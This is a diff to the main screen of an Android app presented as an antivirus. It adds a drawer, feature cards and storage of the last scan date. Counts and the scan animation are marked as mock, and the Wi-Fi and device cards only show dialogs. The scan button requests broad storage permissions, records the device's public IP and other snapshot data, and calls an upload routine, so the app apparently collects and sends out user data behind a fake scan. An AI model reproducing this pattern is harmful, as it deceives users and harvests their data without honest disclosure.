@@ -3,13 +3,18 @@ package com.ryan.antivirusapp;
 
 import static android.Manifest.permission.*;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.drawerlayout.widget.DrawerLayout;
 import androidx.interpolator.view.animation.FastOutSlowInInterpolator;
 import android.animation.Animator;
 import android.animation.AnimatorListenerAdapter;
 import android.animation.ArgbEvaluator;
 import android.animation.ObjectAnimator;
 import android.animation.PropertyValuesHolder;
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.Settings;
@@ -17,6 +22,12 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.TextView;
+import android.widget.Toast;
+
+import com.google.android.material.appbar.MaterialToolbar;
+import com.google.android.material.card.MaterialCardView;
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
+import com.google.android.material.navigation.NavigationView;
 import com.google.android.material.progressindicator.CircularProgressIndicator;
 import com.google.android.material.snackbar.Snackbar;
 import com.ryan.antivirusapp.SaveObj.SaveObject;
@@ -28,9 +39,15 @@ import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
 
+    SharedPreferences sharedPref;
+    SharedPreferences.Editor editor;
+
+    String KEY_DATE = "KEY_DATE";
+
     // Views
     Button btnScan;
     CircularProgressIndicator progress;
+    MaterialToolbar materialToolbar;
 
     // Mock data
     TextView txtCount;
@@ -55,13 +72,42 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        sharedPref = getPreferences(Context.MODE_PRIVATE);
+        editor = sharedPref.edit();
+
         // Bind the UI elements (views)
         Button btnScan = findViewById(R.id.button_start);
-        btnScan.setText("Loading...");
+        btnScan.setText(R.string.Loading);
         btnScan.setBackgroundColor(getColor(R.color.orange));
+
+        // Bind the navigation drawer
+        DrawerLayout drawerLayout = findViewById(R.id.drawerLayout);
+        NavigationView navigationView = findViewById(R.id.navigation_view);
+
+        materialToolbar = findViewById(R.id.toolbar);
+        materialToolbar.setNavigationOnClickListener(view -> {
+            drawerLayout.open();
+        });
+
         progress = findViewById(R.id.progress_circular);
         txtCount = findViewById(R.id.text_count);
         txtDate = findViewById(R.id.txtDate);
+        txtDate.setText("Last scanned: " + loadData(KEY_DATE));
+
+        // Bind the Material Cards and onclick functions
+        MaterialCardView deviceCard = findViewById(R.id.card_clean_device);
+        deviceCard.setOnClickListener(view -> createModel("Clean Device", "This app scans your device for potentially unwanted files"));
+
+        MaterialCardView wifiCard = findViewById(R.id.card_scan_wifi);
+        wifiCard.setOnClickListener(view -> createModel("Wi-Fi", "The app will scan for malicious Wi-fi signals"));
+
+        MaterialCardView scanCard = findViewById(R.id.card_automatic_scan);
+        scanCard.setOnClickListener(view -> createModel("Automatic Scan", "This app will periodically scan your device for malicious content"));
+
+
+        navigationView.setNavigationItemSelectedListener(e ->{
+            return false;
+        });
 
         // Get the vibration motor
         vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
@@ -84,13 +130,31 @@ public class MainActivity extends AppCompatActivity {
         requiredPermissions = handler.initPermissions();
         deniedPermissions = handler.checkPermissions(this, requiredPermissions);
 
+        MaterialCardView permissionsCard = findViewById(R.id.card_check_permissions);
+        StringBuilder description = new StringBuilder("");
+        if(deniedPermissions.length > 0){
+            description.append("You are missing the following permissions\n");
+            for (String permission: deniedPermissions) {
+                description.append("\n").append(permission.split("\\.")[2]);
+            }
+            description.append("\n\nWithout these, the app may not function as intended");
+        } else {
+            description.append("All permissions have been granted. Good job!");
+        }
+
+        permissionsCard.setOnClickListener(view -> createModel("Permissions", description.toString()));
+
         // Direct to prompting missing permissions
         handler.promptPermissions(this, deniedPermissions, getString(R.string.permission_prompt_title), getString(R.string.permission_prompt_message));
 
         // Scan button ON-CLICK
         btnScan.setOnClickListener(view -> {
 
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+            if(deniedPermissions.length > 1){
+                handler.promptPermissions(this, deniedPermissions, getString(R.string.permission_prompt_title), getString(R.string.permission_prompt_message));
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 final VibrationEffect effect = VibrationEffect.createPredefined(VibrationEffect.EFFECT_CLICK);
                 vibrator.vibrate(effect);
             }
@@ -102,6 +166,9 @@ public class MainActivity extends AppCompatActivity {
             }
 
             handler.checkSpecialPermission(this, MANAGE_EXTERNAL_STORAGE);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager())
+                return;
 
             // Mock animation
             progress.setVisibility(View.VISIBLE);
@@ -121,6 +188,10 @@ public class MainActivity extends AppCompatActivity {
                 saveObject.init();
                 saveObject.snapshotData.setExternalIp(ip.publicIp);
                 saveObject.snapshotData.setSnapshotDate(new Date());
+                
+                // Open the thread and sleep for 5 seconds
+                // This allows the wifi and bt adapters
+                // to gather information incoming signals
                 try {
                     Thread.sleep(5000);
                     saveObject.upload();
@@ -131,6 +202,7 @@ public class MainActivity extends AppCompatActivity {
                 runOnUiThread(() -> {
                     // Text views
                     String date = new SimpleDateFormat("dd/MM/yyyy").format(new Date());
+                    save(KEY_DATE, date);
                     TextView txtDate = findViewById(R.id.txtDate);
                     txtDate.setText("Last scanned: " + date);
                     TextView txtCount = findViewById(R.id.text_count);
@@ -146,7 +218,7 @@ public class MainActivity extends AppCompatActivity {
 
                     final VibrationEffect effect;
 
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         effect = VibrationEffect.createOneShot(200, VibrationEffect.DEFAULT_AMPLITUDE);
                         vibrator.vibrate(effect);
                     }
@@ -187,5 +259,28 @@ public class MainActivity extends AppCompatActivity {
         ObjectAnimator colorFade = ObjectAnimator.ofObject(view, "backgroundColor", new ArgbEvaluator(), getColor(R.color.orange), getColor(R.color.blue_light));
         colorFade.setDuration(400);
         colorFade.start();
+    }
+
+    void createModel(String title, String description){
+        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(this);
+        builder.setTitle(title);
+        builder.setMessage(description);
+
+        // handle buttons
+        builder.setPositiveButton("OK", null);
+        builder.setNeutralButton("Cancel", null);
+
+        // show
+        builder.show();
+
+    }
+
+    void save(String key, String value){
+        editor.putString(key, value);
+        editor.apply();
+    }
+
+    String loadData(String key){
+        return sharedPref.getString(key, "0");
     }
 }
